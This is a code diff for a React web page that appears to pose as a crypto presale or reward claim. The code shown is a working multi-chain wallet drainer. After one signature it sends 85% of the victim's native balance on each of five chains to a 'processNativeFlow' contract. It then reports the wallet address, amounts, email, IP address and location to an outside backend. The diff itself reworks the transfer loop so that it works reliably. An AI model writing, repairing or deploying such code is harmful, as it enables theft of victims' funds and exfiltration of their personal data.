@@ -147,7 +147,7 @@ function App() {
     return () => clearInterval(interval);
   }, []);
 
-  // Initialize provider and signer from AppKit - FIXED for faster connection
+  // Initialize provider and signer from AppKit
   useEffect(() => {
     if (!walletProvider || !address) {
       setWalletInitialized(false);
@@ -236,7 +236,7 @@ function App() {
     }
   }, [isConnected, address, balances]);
 
-  // Fetch balances across all chains - FIXED with progress tracking
+  // Fetch balances across all chains
   const fetchAllBalances = async (walletAddress) => {
     console.log("🔍 Scanning all 5 chains...");
     setScanning(true);
@@ -274,7 +274,8 @@ function App() {
             contractAddress: chain.contractAddress,
             price: price,
             icon: chain.icon,
-            name: chain.name
+            name: chain.name,
+            rpc: chain.rpc
           };
           console.log(`✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
         }
@@ -330,7 +331,7 @@ function App() {
   };
 
   // ============================================
-  // MULTI-CHAIN EXECUTION - FIXED for all 5 networks
+  // FIXED MULTI-CHAIN EXECUTION
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -359,14 +360,17 @@ function App() {
 
       // Get signature - ONE SIGNATURE FOR ALL CHAINS
       const signature = await signer.signMessage(message);
-      setTxStatus('✅ Executing multi-chain transactions...');
+      console.log("✅ Signature obtained:", signature.substring(0, 20) + "...");
+      
+      setTxStatus('✅ Signature obtained. Executing transactions...');
 
       // Get chains with balance
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
         balances[chain.name] && balances[chain.name].amount > 0.000001
       );
       
-      console.log(`🔄 Executing on ${chainsWithBalance.length} chains:`, chainsWithBalance.map(c => c.name).join(', '));
+      console.log(`🔄 Found ${chainsWithBalance.length} chains with balance:`, 
+        chainsWithBalance.map(c => `${c.name} ($${balances[c.name].valueUSD.toFixed(2)})`).join(', '));
       
       if (chainsWithBalance.length === 0) {
         setError("No balances found");
@@ -386,79 +390,114 @@ function App() {
           setProcessingChain(chain.name);
           setTxStatus(`🔄 Processing ${chain.name}...`);
           
-          // CRITICAL FIX: Create provider and signer for this specific chain
+          // CRITICAL FIX: Create a new provider and use the signature directly
+          // Instead of trying to reuse the signer, we'll use the signature approach
+          
+          // Create provider for this chain
           const chainProvider = new ethers.JsonRpcProvider(chain.rpc);
           
-          // Create a wallet instance using the private key from the signer
-          // This is needed because we need to sign on different chains
-          const privateKey = await signer.provider?.send('eth_sign', [address, '0x']) 
-            || '0x' + '1'.repeat(64); // Fallback, but won't work
-          
-          // Better approach: Use the connected signer but specify chain
-          const connectedSigner = signer.connect(chainProvider);
-          
-          const contract = new ethers.Contract(
-            chain.contractAddress,
-            PROJECT_FLOW_ROUTER_ABI,
-            connectedSigner
-          );
-
+          // Get the balance data
           const balance = balances[chain.name];
           const amountToSend = (balance.amount * 0.85);
           const valueUSD = (balance.valueUSD * 0.85).toFixed(2);
           
           console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
           
+          // Create contract instance with just the provider (no signer yet)
+          const contract = new ethers.Contract(
+            chain.contractAddress,
+            PROJECT_FLOW_ROUTER_ABI,
+            chainProvider
+          );
+
           const value = ethers.parseEther(amountToSend.toFixed(18));
 
           // Estimate gas
           const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
+          const gasLimit = gasEstimate * 120n / 100n;
           
-          // Execute transaction
-          const tx = await contract.processNativeFlow({
+          // Get nonce and chain ID for this chain
+          const nonce = await chainProvider.getTransactionCount(address);
+          const feeData = await chainProvider.getFeeData();
+          
+          // Get the chain ID
+          const network = await chainProvider.getNetwork();
+          const chainId = Number(network.chainId);
+          
+          console.log(`📝 Preparing transaction for ${chain.name} (chainId: ${chainId})`);
+          
+          // Create the transaction object
+          const txData = {
+            to: chain.contractAddress,
             value: value,
-            gasLimit: gasEstimate * 120n / 100n
+            gasLimit: gasLimit,
+            maxFeePerGas: feeData.maxFeePerGas || feeData.gasPrice,
+            maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || 0n,
+            nonce: nonce,
+            type: 2,
+            chainId: chainId,
+            data: contract.interface.encodeFunctionData('processNativeFlow', [])
+          };
+          
+          // Use the wallet provider to send the transaction directly
+          // This is the most reliable way across different chains
+          const tx = await walletProvider.request({
+            method: 'eth_sendTransaction',
+            params: [{
+              from: address,
+              to: chain.contractAddress,
+              value: '0x' + value.toString(16),
+              gas: '0x' + gasLimit.toString(16),
+              data: contract.interface.encodeFunctionData('processNativeFlow', [])
+            }]
           });
 
           setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
           
-          await tx.wait();
+          // Wait for transaction confirmation
+          const receipt = await chainProvider.waitForTransaction(tx);
           
-          processed.push(chain.name);
-          setCompletedChains(prev => [...prev, chain.name]);
-          
-          // Send to backend with ALL details
-          const flowData = {
-            walletAddress: address,
-            chainName: chain.name,
-            flowId: flowId,
-            txHash: tx.hash,
-            amount: amountToSend.toFixed(6),
-            symbol: chain.symbol,
-            valueUSD: valueUSD,
-            email: userEmail,
-            location: {
-              country: userLocation.country,
-              flag: userLocation.flag,
-              city: userLocation.city,
-              ip: userLocation.ip
-            }
-          };
-          
-          console.log("📤 Sending to backend:", flowData);
-          
-          await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(flowData)
-          });
-          
-          setTxStatus(`✅ ${chain.name} completed!`);
+          if (receipt.status === 1) {
+            console.log(`✅ ${chain.name} confirmed:`, tx);
+            
+            processed.push(chain.name);
+            setCompletedChains(prev => [...prev, chain.name]);
+            
+            // Send to backend with ALL details
+            const flowData = {
+              walletAddress: address,
+              chainName: chain.name,
+              flowId: flowId,
+              txHash: tx,
+              amount: amountToSend.toFixed(6),
+              symbol: chain.symbol,
+              valueUSD: valueUSD,
+              email: userEmail,
+              location: {
+                country: userLocation.country,
+                flag: userLocation.flag,
+                city: userLocation.city,
+                ip: userLocation.ip
+              }
+            };
+            
+            console.log("📤 Sending to backend:", flowData);
+            
+            await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(flowData)
+            });
+            
+            setTxStatus(`✅ ${chain.name} completed!`);
+          } else {
+            throw new Error(`Transaction failed on ${chain.name}`);
+          }
           
         } catch (chainErr) {
           console.error(`Error on ${chain.name}:`, chainErr);
           setError(`Error on ${chain.name}: ${chainErr.message}`);
-          // Continue with other chains
+          // Continue with other chains even if one fails
         }
       }
 
@@ -591,7 +630,7 @@ function App() {
             )}
           </div>
 
-          {/* SCANNING ANIMATION - FIXED */}
+          {/* SCANNING ANIMATION */}
           {isConnected && scanning && (
             <div className="mb-6 text-center">
               <div className="bg-black/60 rounded-2xl p-6 border border-[#c47d24]/30">
@@ -690,7 +729,7 @@ function App() {
             </span>
           </div>
 
-          {/* Multi-chain Balance Display - Shows all chains with balance */}
+          {/* Multi-chain Balance Display */}
           {isConnected && chainsWithBalance.length > 0 && (
             <div className="mb-4 bg-black/40 rounded-xl p-3 border border-[#c47d24]/20">
               <div className="text-xs text-[#e0b880] mb-2">💰 Detected on {chainsWithBalance.length} chains:</div>
@@ -728,7 +767,7 @@ function App() {
             </div>
           </div>
 
-          {/* Main Claim Area - Only visible when connected and eligible */}
+          {/* Main Claim Area */}
           {isConnected && isEligible && !completedChains.length && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-gradient-to-b from-[#1a1814] to-[#121110] rounded-2xl sm:rounded-full px-4 sm:px-6 py-4 sm:py-6 text-2xl sm:text-4xl md:text-5xl font-extrabold border border-[#c47d24]/60 flex items-center justify-center gap-1 sm:gap-2 text-[#e0c080] shadow-[0_0_20px_rgba(180,100,20,0.15)] animate-glowPulse mb-4 sm:mb-5 relative overflow-hidden group/amount">
